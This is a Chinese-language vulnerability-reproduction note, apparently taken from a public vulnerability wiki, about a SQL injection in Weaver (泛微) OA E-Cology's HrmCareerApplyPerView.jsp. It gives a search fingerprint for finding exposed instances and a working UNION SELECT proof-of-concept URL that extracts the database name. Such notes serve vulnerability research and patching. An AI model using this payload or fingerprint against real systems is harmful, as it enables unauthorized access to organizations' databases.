---
title: "泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞"
date: 2026-10-17 09:12:25
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "泛微OA"
tags:
  - "泛微OA"
  - "SQL注入"
  - "漏洞复现"
---
## 漏洞描述

泛微OA E-Cology HrmCareerApplyPerView.jsp 文件存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库敏感文件

## 漏洞影响

```
泛微OA E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

登录页面

![image-20220706133317122](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202207061333252.png)

验证POC

```
/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7
```

![image-20220706133435321](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202207061334390.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA-E-Cology-HrmCareerApplyPerView.jsp-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
